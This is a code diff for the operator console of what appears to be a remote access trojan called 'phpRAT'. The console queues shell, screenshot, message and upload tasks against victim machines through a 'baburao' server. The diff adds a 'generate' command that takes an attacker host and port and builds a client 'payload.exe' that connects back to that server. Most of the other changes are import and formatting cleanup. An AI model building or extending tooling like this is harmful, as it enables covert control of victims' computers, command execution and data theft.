@@ -1,16 +1,15 @@
-import logging
 import threading
 import cmd
 from tabulate import tabulate
 from datetime import datetime
 import re
-from tabulate import tabulate
 import sys
 import time
-from os import system, name
+import os
 from pyfiglet import Figlet
 import random
 from modules import *
+from subprocess import Popen, PIPE
 
 
 class CLI(cmd.Cmd):
@@ -19,7 +18,6 @@ class CLI(cmd.Cmd):
     prompt = '(phpRAT) '
     modules = ['msg', 'shell', 'screenshot', 'upload']
     module = None
-
 
     def get_curr_module(self):
         return re.search('\((.+?)\) ', self.prompt).group(1)
@@ -63,7 +61,7 @@ class CLI(cmd.Cmd):
                     print(tabulate(db.c.fetchall()))
                     lock.release()
             else:
-                print(f"Showing Queue:")
+                print("Showing Queue:")
                 print("===== Complete Tasks =====")
                 lock.acquire(True)
                 db.c.execute(
@@ -92,7 +90,7 @@ class CLI(cmd.Cmd):
             else:
                 print("Use help!")
         else:
-                print("Use help!")
+            print("Use help!")
 
     def do_unset(self, args):
         '''Unset Value of Item'''
@@ -113,13 +111,29 @@ class CLI(cmd.Cmd):
             self.module = globals()[module]()
 
     def do_execute(self, args):
-        if all(option[1] for option in self.module.options if option[2]=='True'):
-            vals = [option[1] for option in self.module.options if option[0]!='machine_id']
+        if all(option[1] for option in self.module.options if option[2] == 'True'):
+            vals = [option[1] for option in self.module.options if option[0] != 'machine_id']
             task_id = queue.insert(
                 self.module.name, self.module.machine_id, args=vals)
             print(f"Added Task {task_id}")
         else:
             print("Check Options!")
+
+    def do_generate(self, args):
+        if len(args) == 0:
+            lhost = input("LHOST: ")
+            lport = input("LPORT: ")
+            server_addr = f"{lhost}:{lport}"
+        else:
+            server_addr = args.strip()
+        print("Generating Payload for", server_addr)
+        os.chdir('./client')
+        build_cmd = f"powershell .\\build.ps1 -Server {server_addr}" if os.name == 'nt' else f"./build.sh --server {server_addr}"
+        process = Popen(build_cmd.split(), stdout=PIPE, stderr=PIPE)
+        stdout, stderr = process.communicate()
+        os.system("copy .\\out\\payload.exe .." if os.name == 'nt' else 'cp ./out/payload.exe ..')
+        os.chdir("..")
+        print("Payload Generated!")
 
     def complete_show(self, text, line, begidx, endidx):
         args_len = 2
@@ -169,7 +183,7 @@ class CLI(cmd.Cmd):
     def completenames(self, text, *ignored):
         dotext = 'do_'+text
         commands = [a[3:] for a in self.get_names() if a.startswith(dotext)]
-        use_commands = ['set', 'unset', 'execute']
+        use_commands = ['set', 'unset', 'execute', 'generate']
         if self.get_curr_module() not in self.modules:
             commands = [
                 command for command in commands if command not in use_commands]
@@ -180,13 +194,13 @@ class CLI(cmd.Cmd):
 
 
 if __name__ == "__main__":
-    sys.path.insert(0, "./server")
-    from baburao import app, queue, db, lock
+    sys.path.insert(0, './server')
+    from server.baburao import app, queue, db, lock
     baburao_thread = threading.Thread(
         target=app.run, kwargs={'host': '0.0.0.0'}, daemon=True)
     baburao_thread.start()
     time.sleep(1)
-    system('cls' if name == 'nt' else 'clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
     fonts_list = ['basic', 'big', 'chunky', 'slant', 'epic', 'standard']
     font = random.choice(fonts_list)
     f = Figlet(font=font)
